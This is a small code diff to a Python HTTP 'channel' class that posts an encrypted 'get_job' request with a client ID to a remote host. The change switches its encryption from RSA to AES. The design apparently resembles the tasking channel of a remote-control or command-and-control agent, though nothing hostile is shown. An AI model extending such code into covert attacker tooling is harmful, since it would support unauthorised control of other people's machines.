@@ -2,7 +2,7 @@ import requests
 import sqlite3
 from abstract import AbstractChannel
 from json import dumps, loads
-from lib.encrypt import RSAencrypt, RSAdecrypt
+from lib.encrypt import RSAencrypt, RSAdecrypt, AESencrypt, AESdecrypt
 from logging import getLogger
 from os.path import exists as file_exists
 
@@ -96,7 +96,7 @@ class HttpChannel(AbstractChannel):
 
         try:
             data = dumps({'task': 'get_job', 'client_id': self.client_id})
-            encrypted = RSAencrypt(data)
+            encrypted = AESencrypt(data, self._key)
             cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}
 
             response = requests.post(self._remote_host,
